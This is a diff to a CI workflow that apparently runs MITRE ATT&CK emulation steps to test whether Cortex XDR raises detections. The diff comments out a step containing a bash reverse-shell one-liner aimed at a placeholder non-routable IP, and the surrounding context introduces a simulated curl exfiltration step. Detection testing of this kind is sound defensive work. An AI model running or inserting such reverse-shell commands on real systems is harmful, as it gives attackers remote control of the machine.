@@ -65,19 +65,19 @@ jobs:
 
           # Clean up
           rm /tmp/config.ini /tmp/app.log
-
-      - name: 4. Run C2 - Unix Shell (MITRE T1059.004)
-        run: |
-          echo "Starting T1059.004: Simulating reverse shell..."
-          echo "This will attempt to connect to a non-existent C2 server."
-          echo "Cortex XDR should detect the bash process spawning a network connection."
-
-          # This attempts a reverse shell. It will fail, but the 
-          # process and network attempt is what gets detected.
-          # We use a non-routable IP to be safe.
-          timeout 5 bash -i >& /dev/tcp/10.255.255.1/4444 0>&1 || true
-          echo "Reverse shell simulation finished."
-
+      #
+      # - name: 4. Run C2 - Unix Shell (MITRE T1059.004)
+      #   run: |
+      #     echo "Starting T1059.004: Simulating reverse shell..."
+      #     echo "This will attempt to connect to a non-existent C2 server."
+      #     echo "Cortex XDR should detect the bash process spawning a network connection."
+      #
+      #     # This attempts a reverse shell. It will fail, but the
+      #     # process and network attempt is what gets detected.
+      #     # We use a non-routable IP to be safe.
+      #     timeout 5 bash -i >& /dev/tcp/10.255.255.1/4444 0>&1 || true
+      #     echo "Reverse shell simulation finished."
+      #
       - name: 5. Run Exfiltration - Over C2 Protocol (MITRE T1048.003)
         run: |
           echo "Starting T1048.003: Simulating data exfiltration via curl..."
